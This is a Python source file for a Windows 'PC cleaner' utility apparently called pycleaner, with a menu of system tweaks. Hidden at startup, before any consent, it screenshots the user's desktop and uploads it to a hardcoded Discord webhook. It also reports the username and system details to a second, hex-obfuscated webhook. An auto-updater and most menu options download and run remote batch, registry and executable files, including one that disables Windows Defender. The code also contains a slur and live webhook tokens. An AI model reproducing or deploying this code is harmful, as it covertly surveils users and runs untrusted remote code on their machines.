import os
try:
    import time,os,sys
except:
    os.system("pip install time")
    import time,os,sys
def typingPrint(text):
  for character in text:
    sys.stdout.write(character)
    sys.stdout.flush()
    time.sleep(0.05)
try:
    from colorama import Fore
except:
    os.system("pip install colorama")
    from colorama import Fore
print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'''checking requirements''')
try:
    import random
except:
    os.system("pip install random")
    import random
try:
    import matplotlib.pyplot as plt
except:
    os.system("pip install matplotlib")
    import matplotlib.pyplot as plt

try:
    from datetime import datetime
except:
    os.system("pip install datetime")
    from datetime import datetime
try:
    import threading
except:
    os.system("pip install threading")
    import threading
try:
    from tkinter import ttk, messagebox
except:
    os.system("pip install tkinter")
    from tkinter import ttk, messagebox
try:
    import webbrowser
except:
    os.system("pip install webbrowser")
    import webbrowser
try:
    from random import randint
except:
    os.system("pip install random")
    from random import randint
try:
    import base64
except:
    os.system("pip install base64")
    import base64
try:
    import os
except:
    os.system("pip install os")
    import os
try:
    import time
except:
    os.system("pip install time")
    import time
try:
    import subprocess
except:
    os.system("pip install subprocess")
    import subprocess
try:
    from pathlib import Path
except:
    os.system("pip install pathlib")
    from pathlib import Path
try:
    import platform
except:
    os.system("pip install platform")
    import platform
try:
    import sys
except:
    os.system("pip install sys")
    import sys
try:
    import socket
except:
    os.system("pip install socket")
    import socket
try:
    import webbrowser
except:
    os.system("pip install webbrowser")
    import webbrowser
try:
    import discord
except:
    os.system("pip install discord")
    import discord
try:
    from colorama import Fore
except:
    os.system("pip install colorama")
    from colorama import Fore
try:
    import shutil
except:
    os.system("pip install shutil")
    import shutil
try:
    from discord_webhook import DiscordWebhook, DiscordEmbed
except:
    os.system("pip install discord_webhook")
    from discord_webhook import DiscordWebhook, DiscordEmbed
try:
    import psutil
except:
    os.system("pip install psutil")
    import psutil
try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    import pystyle
except:
    os.system("pip install pystyle")
    import pystyle

try:
    import colorama
except:
    os.system("pip install colorama")
    import colorama
try:
    from PIL import ImageGrab
except:
    os.system("pip install PIL")
    from PIL import ImageGrab

try:
    from pystyle import Colors, Colorate, Center
except:
    os.system("pip install pystyle")
    from pystyle import Colors, Colorate, Center
try:
    from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
except:
    os.system("pip install pystyle")
    from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from tkinter import font
import tkinter as tk
#and a screenshot cuz ykyk
username = os.getlogin()
try:
 ss_img = ImageGrab.grab()
 ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
 webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138687969689632/nS2hsAmFAmRaklSvYKaWJYw0Q_15mRoV7-sVtgOMFqgKSXuDGAbkZKim9agVUUlmTjZg',username="screenshoter bot", avatar_url= "https://i.imgur.com/jUonyvA.jpeg")
 with open(fr'C:\Users\{username}\AppData\Local\random.png', "rb") as f:
     webhook.add_file(file=f.read(), filename=fr'C:\Users\{username}\AppData\Local\random.png')
 response = webhook.execute(remove_embeds=True, remove_files=True)
 file_path = fr'C:\Users\{username}\AppData\Local\random.png'
 if os.path.isfile(file_path):
  os.remove(file_path)
except Exception as er:
        print('network error, try again later')
        time.sleep(5)
        exit()
#
print(f"{Fore.RESET}[{Fore.BLUE}updater{Fore.RESET}] checking for updates")
#auto update
try:
 THIS_VERSION ='1.9'
 def updater():
      v = requests.get("https://pastebin.com/raw/w29LjVc2").text
      time.sleep(0.5)
      if not THIS_VERSION == v:
        os.system("cls")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] New version available!")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Downloading new version...")
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat"
        r = requests.get(url)  
        with open(fr"updater.bat", 'wb') as f:
         f.write(r.content)
        os.startfile("updater.bat")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Downloaded!")
        input(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Press enter to exit...")
        os._exit(1)
      else:
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] You are running the latest version!")
        time.sleep(0.5)
 updater()
except:
        print('network error, try again later')
        time.sleep(5)
        exit()
#
r = lambda: random.randint(0,255)
dawg = ('%02X%02X%02X' % (r(),r(),r()))
idk = Path.cwd()
k = ''
ong = '"'
now = datetime.now()
ti= (now.strftime('date > '+'%Y/%m/%d'+' time > ''%I:%M:%S'))
lol=(f"     [>] Running with Python  {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]} ")
version = sys.getwindowsversion()
mo = '[>] using '+(platform.system()) + (platform.release())
BY = 'by jotaro'
LMAO = 'version 1.9'
obj_Disk = psutil.disk_usage('/')
psutil.virtual_memory()
username = os.getlogin()
number = (psutil.virtual_memory())
number = str(number)
ramg = int(number[12])
hostname=socket.gethostname() 
path_to_file = fr'C:\Users\{username}\AppData\Roaming\{username} PYCLEANER.txt'  
IPAddr=socket.gethostbyname(hostname)  
tools = os.getcwd()+"\\tools\\"
if not os.path.exists(tools):
    os.mkdir(tools)
#
#i just wanna know how many people ran my shit dont spam my webhook nigga thats gay tho.
webhook = DiscordWebhook(url='\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x30\x35\x38\x36\x34\x38\x37\x30\x30\x31\x34\x36\x31\x35\x35\x39\x33\x2F\x33\x6A\x65\x68\x6D\x59\x59\x2D\x37\x5A\x57\x4F\x44\x5A\x5A\x32\x56\x74\x6E\x53\x42\x32\x46\x57\x42\x32\x77\x63\x79\x76\x4B\x53\x70\x56\x43\x30\x6B\x4C\x77\x55\x48\x41\x6A\x52\x37\x48\x6C\x61\x78\x30\x71\x59\x41\x4E\x66\x39\x44\x76\x66\x77\x38\x49\x62\x62\x49\x2D\x6C\x41' )
webhook = DiscordWebhook(url='\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x30\x35\x38\x36\x34\x38\x37\x30\x30\x31\x34\x36\x31\x35\x35\x39\x33\x2F\x33\x6A\x65\x68\x6D\x59\x59\x2D\x37\x5A\x57\x4F\x44\x5A\x5A\x32\x56\x74\x6E\x53\x42\x32\x46\x57\x42\x32\x77\x63\x79\x76\x4B\x53\x70\x56\x43\x30\x6B\x4C\x77\x55\x48\x41\x6A\x52\x37\x48\x6C\x61\x78\x30\x71\x59\x41\x4E\x66\x39\x44\x76\x66\x77\x38\x49\x62\x62\x49\x2D\x6C\x41', content='<@822132948769177620>', username="pycleaner bot", avatar_url= "https://i.imgur.com/UCwTipK.png")
embed = DiscordEmbed(title='pycleaner ', description = username +' used ur program damn ', color=dawg)
embed.set_footer(text= mo + lol +' '+ti)
webhook.add_embed(embed)
response = webhook.execute()
print(f"{Fore.RESET}[{Fore.RED}PYCLEANER{Fore.RESET}]"+'done')
# THIS CREATES THE TOOLS DIRECTORY IN THE SAME DIRECTORY, IF IT DOES NOT EXIST, IN WHICH THE PYTHON SCRIPT IS RAN. 
ver = Center.XCenter('''
by jotaro 
██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗  ░░███╗░░░░░░█████╗░
██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ░████║░░░░░██╔══██╗
╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ██╔██║░░░░░╚██████║
░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ╚═╝██║░░░░░░╚═══██║
░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗░█████╔╝
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝░╚════╝░''')
__author__ = 'jotaro' 
__VERSION__ = '1.9'
os.system("title PRESS ENTER")

bannerfr =LMAO+r'''
███████╗██████╗░  ░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗░
██╔════╝██╔══██╗  ██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
█████╗░░██████╔╝  ██║░░╚═╝██║░░░░░█████╗░░███████║██╔██╗██║█████╗░░██████╔╝
██╔══╝░░██╔══██╗  ██║░░██╗██║░░░░░██╔══╝░░██╔══██║██║╚████║██╔══╝░░██╔══██╗
██║░░░░░██║░░██║  ╚█████╔╝███████╗███████╗██║░░██║██║░╚███║███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
'''+ BY + '                  welcome, '+username  
System.Size(120, 30)
System.Clear()
Anime.Fade(Center.XCenter(bannerfr), Colors.rainbow, Colorate.Vertical, interval=0.025, enter=True)


banner = Center.XCenter(LMAO+"""
███████╗██████╗░  ░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗░
██╔════╝██╔══██╗  ██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
█████╗░░██████╔╝  ██║░░╚═╝██║░░░░░█████╗░░███████║██╔██╗██║█████╗░░██████╔╝
██╔══╝░░██╔══██╗  ██║░░██╗██║░░░░░██╔══╝░░██╔══██║██║╚████║██╔══╝░░██╔══██╗
██║░░░░░██║░░██║  ╚█████╔╝███████╗███████╗██║░░██║██║░╚███║███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
"""+BY)
banner2 =Center.XCenter(mo + lol)



options =f"""

                       {Fore.RESET}{Fore.RED}h.){Fore.RESET} {Fore.RESET}{Fore.GREEN}hibernate{Fore.RESET}    {Fore.RESET}{Fore.RED}s.){Fore.RESET} {Fore.RESET}{Fore.GREEN}shutdown{Fore.RESET}    {Fore.RESET}{Fore.RED}r.){Fore.RESET} {Fore.RESET}{Fore.GREEN}restart{Fore.RESET}    {Fore.RESET}{Fore.RED}re.){Fore.RESET} {Fore.RESET}{Fore.GREEN}restart explorer{Fore.RESET}         
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
{Fore.RESET}{Fore.RED} 1.){Fore.RESET}{Fore.GREEN}  create a restore point          {Fore.RESET}{Fore.RED}2.){Fore.RESET}{Fore.GREEN}  temp cleaner                     {Fore.RESET}{Fore.RED}3.){Fore.RESET}{Fore.GREEN}  log cleaner
{Fore.RESET}{Fore.RED} 4.){Fore.RESET}{Fore.GREEN}  disable services                {Fore.RESET}{Fore.RED}5.){Fore.RESET}{Fore.GREEN}  Services Optimization            {Fore.RESET}{Fore.RED}6.){Fore.RESET}{Fore.GREEN}  battery check (laptops only)
{Fore.RESET}{Fore.RED} 7.){Fore.RESET}{Fore.GREEN}  turn on hibernate               {Fore.RESET}{Fore.RED}8.){Fore.RESET}{Fore.GREEN}  tree (better Responsiveness)     {Fore.RESET}{Fore.RED}9.){Fore.RESET}{Fore.GREEN}  Delete Windows Update Cache
{Fore.RESET}{Fore.RED} 10.){Fore.RESET}{Fore.GREEN} disable windows defender        {Fore.RESET}{Fore.RED}11.){Fore.RESET}{Fore.GREEN} sfc scan                         {Fore.RESET}{Fore.RED}12.){Fore.RESET}{Fore.GREEN} Debloater (use it if u know how to)
{Fore.RESET}{Fore.RED} 13.){Fore.RESET}{Fore.GREEN} open restore point              {Fore.RESET}{Fore.RED}14.){Fore.RESET}{Fore.GREEN} memreduct                        {Fore.RESET}{Fore.RED}15.){Fore.RESET}{Fore.GREEN} TimerResolution
{Fore.RESET}{Fore.RED} 16.){Fore.RESET}{Fore.GREEN} amber tweaker                   {Fore.RESET}{Fore.RED}17.){Fore.RESET}{Fore.GREEN} reset wifi (speed up wifi a bit) {Fore.RESET}{Fore.RED}18.){Fore.RESET}{Fore.GREEN} HoneCtrl optimizer                  
{Fore.RESET}{Fore.RED} 19.){Fore.RESET}{Fore.GREEN} check health                    {Fore.RESET}{Fore.RED}20.){Fore.RESET}{Fore.GREEN} scan health                      {Fore.RESET}{Fore.RED}21.){Fore.RESET}{Fore.GREEN} restore health  
{Fore.RESET}{Fore.RED} 22.){Fore.RESET}{Fore.GREEN} O & O shutup (antispy)          {Fore.RESET}{Fore.RED}23.){Fore.RESET}{Fore.GREEN} open disk cleanup                {Fore.RESET}{Fore.RED}24.){Fore.RESET}{Fore.GREEN} Registry tweaks(op)             
{Fore.RESET}{Fore.RED} 25.){Fore.RESET}{Fore.GREEN} BCDTweaks                       {Fore.RESET}{Fore.RED}26.){Fore.RESET}{Fore.GREEN} Optimize ALL Windows Settings    {Fore.RESET}{Fore.RED}27.){Fore.RESET}{Fore.GREEN} remove files in the tool folder 
{Fore.RESET}{Fore.RED} 28.){Fore.RESET}{Fore.GREEN} more info                       {Fore.RESET}{Fore.RED}29.){Fore.RESET}{Fore.GREEN} exit                             {Fore.RESET}{Fore.RED}30.){Fore.RESET}{Fore.GREEN} add suggestion   
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
"""
# THIS DOWNLOADS THE BAT FILES TO THE TOOLS DIRECTORY. THIS TAKES THE URL AND THE NAME OF THE BAT FILE.
def download(url, name):
    response =  requests.get(url)
    open(tools+name, "w").write(response.text)
    os.startfile(tools+name)

def main():
    os.system('cls')
    path = Path(path_to_file)
    if path.is_file():
     fr()
    else:
     print(Colors.blue,fr'''{Fore.YELLOW}    fr cleaner is a free and open-source desktop utility made by jotaro
     {Fore.YELLOW}made to improve your day-to-day productivity
     
     {Fore.RESET}{Fore.RED}WARNING!{Fore.RESET}{Fore.BLUE}
     Please note that we cannot guarantee an FPS boost from applying our optimizations,
     every system + configuration is different.
     Everything is {Fore.RESET}{Fore.RED}USE IT ON YOUR OWN RISK{Fore.RESET}{Fore.BLUE}, we are {Fore.RESET}{Fore.RED}NOT LIABLE{Fore.RESET}{Fore.BLUE} if you damage your system in any way 
     (ex. not following the disclaimers carefully).
     If you don't know what a tweak is, do not use it and contact {Fore.RESET}{Fore.RED}jotaro#0005{Fore.RESET}{Fore.BLUE} to receive more assistance.
     Even though we have an restore point feature{Fore.RESET}{Fore.GREEN}(option 1){Fore.RESET}{Fore.BLUE} 
     highly recommend making a manual restore point before running.
     {Fore.RESET}{Fore.RED}PLEASE USE THE TOOLS THAT YOU KNOW HOW TO USE THEM{Fore.RESET}{Fore.BLUE}  
   
     Please enter {Fore.RESET}{Fore.RED}"i agree"{Fore.RESET}{Fore.BLUE}  without quotes to continue: 
     ''')
    x = input(f'>:{Fore.RED}')
    if x != 'i agree':
     main()
    if x == 'i agree':
     webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138871613108295/RrTjyJBbAKtRDkJegmQnIJ9HxzC52Nf0fbB2yTD5Bt7D1jWvKtRNKiW5gOPghzl1PL8a', username="agree bot", avatar_url= "https://i.imgur.com/KHMc04p.png" )
     embed = DiscordEmbed(title='pycleaner ', description= username +' agreed', color=dawg)
     webhook.add_embed(embed)
     response = webhook.execute()
     with open(path_to_file, 'w') as f:
      f.write('PYCLEANER STUFF, DELETE IT IF U WANT BUT THE DISCLAIMER WILL REOPEN EVERYTIME U DELETE IT FR')
     os.system('cls')
     fr()

def fr():
     os.system("title  Hello, "+   username)
     os.system('cls')
     print(Colorate.Vertical(Colors.blue_to_red, banner2))
     print(Colorate.Vertical(Colors.rainbow, banner + options, 2))
     choice = input(Colors.blue + 'Which option do you choose '+ username+f'? ->{Fore.RED}  ')
    #restore point
     if choice == '1':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/point.bat", "point.bat")
    #temp
     if choice == '2':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/temp.bat", "temp_cleaner.bat")
        
    #log cleaner
     elif choice == '3':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/log%20cleaner.bat", "log_cleaner.bat")
       
    #disable services
     elif choice == "4":
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/services.bat", "disable_services.bat")
  
    #service_optimizer
     elif choice == "5":
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/optimization.bat", "service_optimizer.bat")

    #battery_check
     elif choice == '6':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/battery.bat", "battery_check.bat")
 
    #hibernate
     elif choice == '7':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/hibernate.bat", "hibernate.bat")

    #tree
     elif choice == '8':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/tree.bat", "tree.bat")

    #windows update
     elif choice == '9':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/update.cmd", "delete_windows_update_cache.cmd")

    #disable_services
     elif choice == '10':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/def.reg", "disable_windows_defender.reg")
    #sfc scan
     elif choice == '11':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/sfc.bat", "sfc.bat")
       
    #debloater   
     elif choice == '12':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Debloater.bat", "Debloater.bat")
     
     elif choice == '13':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/openp.bat", "openp.bat")
        
     elif choice == '14':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/memreduct.exe"
        r = requests.get(url)  
        with open(fr"tools\memreduct.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\memreduct.exe")
        
     elif choice == '15':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/TimerResolution.exe"
        r = requests.get(url)  
        with open(fr"tools\TimerResolution.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\TimerResolution.exe")
        
     elif choice == '16':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/amberfps.exe"
        r = requests.get(url)  
        with open(fr"tools\amber.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\\amber.exe")
        
     elif choice == '17':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/wifi.bat", "wifi.bat")
       
        
     elif choice == '18':
        download("https://github.com/auraside/HoneCtrl/releases/latest/download/HoneCtrl.Bat", "HoneCtrl.bat")
        
     elif choice == '19':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/checkhealth.bat", "checkhealth.bat")
        
     elif choice == '20':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/scanhealth.bat", "scanhealth.bat")
        
     elif choice == '21':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/restorehealth.bat", "restorehealth.bat")
        
        
     elif choice == '22':
        url = "https://dl5.oo-software.com/files/ooshutup10/OOSU10.exe"
        r = requests.get(url)  
        with open(fr"tools\OOSU10.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\\OOSU10.exe")
        
     elif choice == '23':
        os.startfile("C:\Windows\System32\cleanmgr.exe")
        
     elif choice == '24':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/RegistryTweaks.reg", "RegistryTweaks.reg")
        
     elif choice == '25':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/BCDTweaks.cmd", "BCDTweaks.cmd")
        
     elif choice == '26':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Optimize%20ALL%20Windows%20Settings.reg", "Optimize ALL Windows Settings.reg")
    #tools
     elif choice == '27':
      try:
       shutil.rmtree("tools")
       os.mkdir(tools)
       print(f"{Fore.RESET}[{Fore.BLUE}pycleaner{Fore.RESET}] deleting tools file..." )
       typingPrint(f"{Fore.RESET}[{Fore.BLUE}pycleaner{Fore.RESET}] tools files deleted." ) 
       time.sleep(4)
       main()
      except Exception as e:
         a1 = f"{Fore.RESET}[{Fore.BLUE}pycleaner{Fore.RESET}] please close all apps and background apps and try again especially '{e}"
         a2 = a1.replace("[WinError 5] Access is denied: "+"'tools\\\\", '')
         print(a2)    
         time.sleep(9)
         main()
         


        
    #more info
     elif choice == '28':
        os.system('cls')
        print(Colorate.Vertical(Colors.rainbow,ver))
        print(f'{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
        print(Colors.yellow,mo+lol)
        print((platform.machine())+ ' bit' )
        print("ur ip: "+IPAddr+' nice ip ngl')
        print('path: ', idk)
        print(ti)
        print(ramg,'gb ram')
        print('ur username is ' +   username)
        print ('total gb: ',obj_Disk.total / (1024.0 ** 3)) , print ('used gb:',obj_Disk.used / (1024.0 ** 3))
        print ('free gb:',obj_Disk.free / (1024.0 ** 3))
        print ('%: ',obj_Disk.percent)
        print('RAM memory % used:', psutil.virtual_memory()[2])
        print(f'{Fore.RESET}{Fore.RED}hit enter {Fore.RESET}{Fore.GREEN}to go back')
        print(f'{Fore.RESET}{Fore.RED}type 1 {Fore.RESET}{Fore.GREEN}for github')
        print(f'{Fore.RESET}{Fore.RED}type 2 {Fore.RESET}{Fore.GREEN}for disclaimer')
        print(f'{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
        choice = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
        if choice == '1':
         webbrowser.open("https://github.com/j0taro/pycleaner")
        if choice == '2':
         if os.path.isfile(path_to_file):
          os.remove(path_to_file)
          main()
         else:
           main()
        
    #exit
     elif choice == '29': 
        os._exit(0) 
        
     elif choice =='30':
      suggestion = input(f"enter ur suggestion:{Fore.RED} ")
      if suggestion == '':
        print('invaid suggestion please try again later.')
        time.sleep(4)
        main()
      webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138390903926897/vjocJhEyoGpm8SVjQjE_vAjR3vq6aKpONpQVp4l4y7X3QEfiKNSWl3zrCLacEAGl1UvK', content='<@822132948769177620>', username="new suggestion",avatar_url= "https://i.imgur.com/NK0ctzM.png")
      embed = DiscordEmbed(title='new suggestion ', description= 'damn '+username +''' added a new suggestion:
 ''' + ong + suggestion+ong, color=dawg)
      embed.set_footer(text=mo + lol +' '+ ti)
      webhook.add_embed(embed)
      response = webhook.execute()
      typingPrint(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER UPLOADER{Fore.RESET}]"+ong+suggestion+ong+' has been uploaded, thanks for ur suggestion')
      time.sleep(0)
      main()
     
     elif choice == 'h': 
        h = input(Colors.blue + f'are you sure you want to hibernate? y,n :{Fore.RED}')
        if h == 'y':
         os.system("cls")
         typingPrint(f"{Fore.RESET}[{Fore.BLUE}SYSTEM{Fore.RESET}]"+'hibernating in 3..')
         time.sleep(1)
         typingPrint("2..")
         time.sleep(1)
         typingPrint("1..")
         time.sleep(1)
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/hib.bat", "hib.bat") 
         os._exit(0)
        if h == 'n':
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'ok going back')
         time.sleep(2)
        else:
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'invaild option please try again later')
         time.sleep(4)
         main()
         
         
     elif choice == 's': 
        shut = input(Colors.blue + f'are you sure you want to shutdown? y,n :{Fore.RED}')
        if shut == 'y':
         os.system("cls")
         typingPrint(f"{Fore.RESET}[{Fore.BLUE}SYSTEM{Fore.RESET}]"+'shutting down in 3..')
         time.sleep(1)
         typingPrint("2..")
         time.sleep(1)
         typingPrint("1..")
         time.sleep(1)
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/shut.bat", "shut.bat") 
        if shut == 'n':
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'ok going back')
         time.sleep(2)        
        else:
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'invaild option please try again later')
         time.sleep(4)
         main()
         
     elif choice == 'r': 
        res = input(Colors.blue + f'are you sure you want to restart? y,n :{Fore.RED}')
        if res == 'y':
         os.system("cls")
         typingPrint(f"{Fore.RESET}[{Fore.BLUE}SYSTEM{Fore.RESET}]"+'restarting in 3..')
         time.sleep(1)
         typingPrint("2..")
         time.sleep(1)
         typingPrint("1..")
         time.sleep(1)
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/restart.bat", "restart.bat") 
        if res == 'n':
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'ok going back')
         time.sleep(2)        
        else:
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'invaild option please try again later')
         time.sleep(4)
         main()
         
     elif choice == 're': 
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'soft restarting in 2 secounds please wait')
         time.sleep(2)
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/softr.bat", "softr.bat") 
         main()
         
     elif choice == 'dev':
      key = input(Colors.blue + f'whats the key? -> {Fore.RED} ')
      if key != '\x30\x35\x37\x2F\x2A':
        print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER key{Fore.RESET}]"+'wrong key!!!!!!!!!')
        time.sleep(4)
        main()
      if key == '\x30\x35\x37\x2F\x2A':
        print('1 = pastebin')
        print('2 = github')
        print('3 = large generator')
        print('4 = replit')
        print('5 = all')
        ff = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
      if ff == '1':
        webbrowser.open("https://pastebin.com/w29LjVc2")
      if ff == '2':
        webbrowser.open("https://github.com/j0taro/pycleaner/blob/main/pycleaner.py") 
      if ff == '3': 
        webbrowser.open("https://fsymbols.com/generators/tarty/") 
      if ff == '4':
        webbrowser.open("https://replit.com/@BLUS2TLIa/UntimelyImpressionableAdministration#new.txt")
      if ff == '5':
        webbrowser.open("https://fsymbols.com/generators/tarty/") 
        webbrowser.open("https://github.com/j0taro/pycleaner/blob/main/pycleaner.py") 
        webbrowser.open("https://pastebin.com/w29LjVc2")          
      if ff !='1' '2' '3' '4' '5':
       typingPrint(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'invaild option please try again later')
       time.sleep(0)
       main()
        
      
        
    #else       
     else:
        print("what?\n") 
        typingPrint("try agian "+ username)
        time.sleep(0)
        main()
     main()
    



if __author__ != "\x6A\x6F\x74\x61\x72\x6F":
    typingPrint("ERROR, dont play with the code dumbass")
    os._exit(10)
         
main()
